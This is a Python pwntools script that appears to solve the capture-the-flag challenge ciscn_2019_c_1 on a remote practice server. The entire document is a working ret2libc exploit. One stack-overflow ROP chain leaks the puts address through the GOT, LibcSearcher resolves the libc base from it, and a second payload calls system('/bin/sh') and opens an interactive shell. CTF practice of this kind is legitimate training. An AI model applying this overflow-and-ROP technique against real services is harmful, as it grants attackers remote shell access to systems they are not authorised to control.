from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'

conn = remote("node4.buuoj.cn", 28872)
#conn = process("./ciscn_2019_c_1")
elf = ELF('./ciscn_2019_c_1')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x400c83
main = 0x400b28

conn.recvuntil(b"Input your choice!\n")
conn.sendline(b'1')

conn.recvuntil(b'Input your Plaintext to be encrypted\n')
# ret = 0x4005a5
payload = b'a'* (0x50 + 0x8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) 
conn.sendline(payload)
conn.recvuntil(b'Ciphertext\n')
conn.recvuntil(b'\n')
puts_addr = conn.recvuntil(b'\n')[:-1]
puts_addr = u64(puts_addr.ljust(0x8, b'\x00'))
print(f'puts_addr: {hex(puts_addr)}')

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
print(f'system: {hex(system)}')
print(f'binsh: {hex(binsh)}')

conn.recvuntil(b'Input your choice!\n')
conn.sendline(b'1')
conn.recvuntil(b'Input your Plaintext to be encrypted\n')
payload = b'a' * (0x50 + 0x8) + p64(0x400c84)  +p64(pop_rdi_ret) + p64(binsh) + p64(system)
conn.sendline(payload)
conn.recv()
conn.interactive()
